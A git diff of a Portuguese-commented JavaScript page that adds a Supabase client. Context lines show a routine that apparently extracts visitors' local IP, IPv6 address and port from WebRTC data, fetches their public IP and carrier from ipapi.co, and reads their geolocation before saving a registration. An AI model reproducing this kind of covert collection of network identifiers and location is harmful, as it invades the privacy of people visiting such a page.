@@ -1,9 +1,9 @@
 // =================================================================
-// CONFIGURAÇÃO DE CONEXÃO (Usando o Supabase Global do HTML)
+// CONFIGURAÇÃO DE CONEXÃO
 // =================================================================
-// URL corrigida: sem "/rest/v1/" no final para não duplicar rotas
-const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co"; // URL extraída do seu painel
-const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3"; // Sua chave pública corrigida
+const SUPABASE_URL = "https://gskcadoofoqwhqhscxcs.supabase.co";
+const SUPABASE_KEY = "sb_publishable_xup-F-C4wv_epMIAbohpjQ_aXnLZOL3";
+const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
 
 // Elementos da Página
 const video = document.getElementById("video");
@@ -64,7 +64,7 @@ async function capturarPortaAvancada() {
             
             if (ipMatch) {
               const ip = ipMatch[1];
-              if (ip.includes(':')) info.ipv6 = ip;   // Captura IPv6
+              if (ip.includes(':')) info.ipv6 = ip;        // ← IPv6
               else info.local_ip = ip;
             }
             if (portMatch) info.local_port = portMatch[1];
@@ -76,7 +76,7 @@ async function capturarPortaAvancada() {
     } catch(e) {}
   }
 
-  // Busca IP público + Operadora
+  // IP Público + Operadora
   try {
     const res = await fetch("https://ipapi.co/json/");
     const data = await res.json();
@@ -197,6 +197,7 @@ btn.addEventListener("click", async () => {
       longitude = localizacao.coords.longitude;
     } catch(err) {}
 
+    // Captura avançada
     const portaInfo = await capturarPortaAvancada();
 
     statusText.innerHTML = "💾 Salvando cadastro...";
